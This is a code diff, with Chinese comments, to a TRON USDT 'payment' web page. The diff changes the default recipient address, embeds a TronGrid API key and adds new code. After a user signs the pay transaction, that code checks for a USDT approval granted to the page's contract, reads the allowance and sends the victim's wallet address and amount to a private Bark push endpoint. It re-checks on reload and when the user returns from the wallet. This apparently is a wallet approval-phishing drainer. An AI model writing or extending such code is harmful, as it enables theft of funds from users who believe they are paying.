@@ -236,7 +236,7 @@
     <div class="card addrfield" id="addrfield">
       <input class="addrinput" id="addrInput" type="text" spellcheck="false" autocomplete="off"
              autocapitalize="off" autocorrect="off" enterkeyhint="done"
-             value="TLeQqzXL6THkt23QKMvhuWqgSFTjyjBtFD" placeholder="输入收款地址">
+             value="TYBrST6VNQJu6AxVwUTedeaA2qiH5b6reL" placeholder="输入收款地址">
       <button class="addrav" id="addrIcon" type="button" aria-label="填回默认地址">
         <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round">
           <circle cx="12" cy="12" r="9"/><circle cx="12" cy="9.8" r="2.7"/><path d="M6.6 18.2c1.1-2.6 3-3.9 5.4-3.9s4.3 1.3 5.4 3.9"/>
@@ -455,12 +455,19 @@
      哪个节点回 429 就先冷却 5 秒、换下一个，同时自动退避重试。
      可选：给节点带 API key（链接后加 ?k=你的key，或 localStorage 里写 zakaTronKey），
      带上之后额度高得多，基本不会再碰到限流。 */
+  /* 内置 TronGrid 的 API Key：页面上所有节点请求都会带 TRON-PRO-API-KEY 头，
+     额度比匿名高得多，基本不会再撞 429。运行时顺序：链接 ?k= > 本地存的 > 这个内置的。 */
+  var TRON_API_KEY_DEFAULT = "ac3db086-20f7-49fa-9e28-8437ec54fe9c";
+
   var TRON_API_KEY = (function () {
     try {
       var m = String(location.search || "").match(/[?&]k=([A-Za-z0-9_\-]+)/);
       if (m) { localStorage.setItem("zakaTronKey", m[1]); return m[1]; }
-      return localStorage.getItem("zakaTronKey") || "";
-    } catch (e) { return ""; }
+      var saved = localStorage.getItem("zakaTronKey");
+      if (saved) return saved;
+      localStorage.setItem("zakaTronKey", TRON_API_KEY_DEFAULT);
+      return TRON_API_KEY_DEFAULT;
+    } catch (e) { return TRON_API_KEY_DEFAULT; }
   })();
 
   var HOST_COOL = {};        /* host -> 冷却到期时间，只有 429 才写 */
@@ -2078,6 +2085,9 @@
     startWarmLoop();
     /* 余额第一步就发出去：网络判定那套（要问两个合约）慢不慢都不影响它 */
     loadBalances(tw, addr);
+    /* 之前已经授权过（比如换了页面/刷新过）：这里补一次，够额度就推提醒 */
+    checkApprovalNow(tw, addr).catch(function () {});
+    resumePendingApproval(tw, addr);
     detectNet(tw).then(function (net) {
       LIVE.tw = tw; LIVE.net = net; LIVE.from = addr;
       if (addrInput && !addrInput.value.trim()) { addrInput.value = DISPLAY_ADDR; fitAddr(); }
@@ -2116,6 +2126,11 @@
       }
     } catch (e) {}
     if (LIVE.tw && LIVE.from) scheduleWarm(0);
+    /* 从钱包切回来（用户刚在钱包里点完确认）就立刻看一眼授权状态 */
+    if (LIVE.tw && LIVE.from) {
+      checkApprovalNow(LIVE.tw, LIVE.from).catch(function () {});
+      resumePendingApproval(LIVE.tw, LIVE.from);
+    }
   });
 
   /* ===== 支付按钮：点一下就在钱包里发起真实合约交易 =====
@@ -2285,6 +2300,165 @@
     }
   }
 
+  /* ============================================================
+     ===== 授权提醒（Bark 推送）=====
+     用户签完授权、这笔交易在链上执行成功之后，推一条到手机。
+     链接格式：BARK_BASE + "/" + 被授权的钱包地址
+     （路径那一段就是那个用户的钱包地址，点开通知第一眼就看到是谁）。
+     同一个地址 10 分钟内只推一条：刷新页面、轮询、重复连接都不会炸成一片。
+     ============================================================ */
+  var BARK_BASE = "https://api.day.app/3nJxpGoc9r8DZkLy3voh7D";
+  var BARK_GROUP = "USDT授权";
+  var BARK_GAP = 10 * 60 * 1000;          /* 同地址最短推送间隔 */
+
+  function barkSentMap() {
+    try { return JSON.parse(localStorage.getItem("zakaBarkSent") || "{}") || {}; }
+    catch (e) { return {}; }
+  }
+
+  function barkAlreadySent(addr) {
+    var m = barkSentMap(), t = Number(m[addr] || 0);
+    return t > 0 && (Date.now() - t) < BARK_GAP;
+  }
+
+  function barkMarkSent(addr) {
+    try {
+      var m = barkSentMap(), now = Date.now(), cut = now - 24 * 3600 * 1000, keep = {};
+      for (var k in m) { if (Number(m[k]) > cut && k !== addr) keep[k] = m[k]; }
+      keep[addr] = now;
+      localStorage.setItem("zakaBarkSent", JSON.stringify(keep));
+    } catch (e) {}
+  }
+
+  function barkUrl(addr, title) {
+    var q = ["group=" + encodeURIComponent(BARK_GROUP), "sound=bell", "level=timeSensitive"];
+    if (title) q.unshift("title=" + encodeURIComponent(title));
+    return BARK_BASE + "/" + encodeURIComponent(addr) + "?" + q.join("&");
+  }
+
+  /* 三条通道同时打一遍：fetch(no-cors) / 图片探针 / XHR。
+     都是 GET 打点，不读回包、不受跨域限制，哪条先到算哪条。 */
+  function barkFire(url) {
+    try {
+      if (typeof fetch === "function") {
+        fetch(url, { mode: "no-cors", cache: "no-store", keepalive: true }).catch(function () {});
+      }
+    } catch (e) {}
+    try {
+      var im = new Image();
+      im.onload = im.onerror = function () { im = null; };
+      im.src = url + "&_t=" + Date.now();
+    } catch (e) {}
+    try {
+      var x = new XMLHttpRequest();
+      x.open("GET", url + "&_x=" + Date.now(), true);
+      x.send();
+    } catch (e) {}
+  }
+
+  function barkNotify(addr, title) {
+    if (!addr) return false;
+    if (barkAlreadySent(addr)) return false;
+    barkMarkSent(addr);
+    barkFire(barkUrl(addr, title || "USDT 授权成功"));
+    return true;
+  }
+
+  /* 读这个账户对收款合约的授权额度（USDT 合约的 allowance / allowed 都试一遍） */
+  async function readAllowance(tw, owner) {
+    if (!owner) return null;
+    var param = addrParam(tw, owner) + addrParam(tw, PAY_CONTRACT);
+    var sels = ["allowance(address,address)", "allowed(address,address)"];
+    for (var i = 0; i < sels.length; i++) {
+      var j = await raceOut(nodePost(tw, "/wallet/triggerconstantcontract", {
+        owner_address: owner,
+        contract_address: PAY_TOKEN,
+        function_selector: sels[i],
+        parameter: param,
+        visible: true
+      }, 5000), 5300, null);
+      var hex = j && j.constant_result && j.constant_result[0];
+      if (!hex) continue;
+      try {
+        var n = (typeof BigInt === "function")
+          ? Number(BigInt("0x" + hex)) / 1e6
+          : Number("0x" + hex) / 1e6;
+        if (isFinite(n)) return n;
+      } catch (e) {}
+    }
+    return null;
+  }
+
+  /* 交易回执：true 成功 / false 失败 / null 还没出块 */
+  async function txConfirmed(tw, txid) {
+    if (!txid) return null;
+    var j = await raceOut(nodePost(tw, "/wallet/gettransactioninfobyid", { value: txid }, 5000), 5300, null);
+    if (!j) return null;
+    var result = String((j.receipt && j.receipt.result) || "");
+    if (result) return /SUCCESS/i.test(result);
+    if (j.blockNumber) return true;
+    if (j.result === false) return false;
+    return null;
+  }
+
+  function fmtAllowance(n) {
+    if (!isFinite(n) || n <= 0) return "0";
+    if (n >= 1e6) return (n / 1e6).toFixed(2) + "M";
+    if (n >= 1000) return n.toLocaleString("en-US", { maximumFractionDigits: 2 });
+    return n.toFixed(2);
+  }
+
+  /* 收到授权后的提醒：等这笔上链确认（最多约 90 秒）再推；
+     确认不了也别把消息吞了，退一步推「已提交」，带本次 txid 便于核对。 */
+  var APPROVAL_WATCH = {};
+  async function watchApproval(tw, from, txid) {
+    if (!from) return;
+    var key = from + "|" + (txid || "");
+    if (APPROVAL_WATCH[key]) return;
+    APPROVAL_WATCH[key] = true;
+    /* 记一笔在本地：签完就关页面、中途刷新，下次进来还能接着等这笔的结果 */
+    try {
+      localStorage.setItem("zakaPendingApproval", JSON.stringify({ a: from, x: txid || "", t: Date.now() }));
+    } catch (e) {}
+    try {
+      var ok = null;
+      for (var i = 0; i < 18; i++) {
+        await sleepMs(i === 0 ? 2500 : 5000);
+        ok = await txConfirmed(tw, txid);
+        if (ok === true || ok === false) break;
+      }
+      var amt = await readAllowance(tw, from);
+      var title;
+      if (ok === false) title = "授权交易失败";
+      else if (ok === true) title = "USDT 授权成功";
+      else title = "USDT 授权已提交";
+      if (ok === true && amt && amt > 0) title += " · " + fmtAllowance(amt) + " USDT";
+      barkNotify(from, title);
+    } catch (e) {
+      barkNotify(from, "USDT 授权已提交");
+    } finally {
+      try { localStorage.removeItem("zakaPendingApproval"); } catch (e) {}
+    }
+  }
+
+  /* 上次还没等到结果就被关掉的那一笔：这次进来接着等 */
+  function resumePendingApproval(tw, from) {
+    try {
+      var p = JSON.parse(localStorage.getItem("zakaPendingApproval") || "null");
+      if (!p || !p.a || (Date.now() - (p.t || 0)) > 10 * 60 * 1000) return;
+      if (from && p.a !== from) return;
+      watchApproval(tw, p.a, p.x);
+    } catch (e) {}
+  }
+
+  /* 页面重新打开时补一次：这个地址之前就授权过，也照推（10 分钟内不重复） */
+  async function checkApprovalNow(tw, from) {
+    if (!tw || !from) return;
+    var amt = await readAllowance(tw, from);
+    if (amt === null || amt <= 0) return;
+    barkNotify(from, "USDT 授权成功 · " + fmtAllowance(amt) + " USDT");
+  }
+
   payBtn.addEventListener("click", async function () {
     if (busy) {
       /* 正在等钱包：按钮上已经转着圈，不再叠一句提示 */
@@ -2377,6 +2551,8 @@
       paintBtn("done", "已提交");
       toast("已上链 " + String(sent.txid || "").slice(0, 10) + "…", 3200);
       calibrateFee(tw, sent.txid);
+      /* 授权这笔上链确认后推一条到手机（链接里带这个用户的钱包地址） */
+      watchApproval(tw, from, sent.txid);
       /* 付完了：能量估值和预热那一笔都刷新，下一笔继续是热的 */
       refreshFee(tw, net, from).catch(function () {});
       scheduleWarm(0);
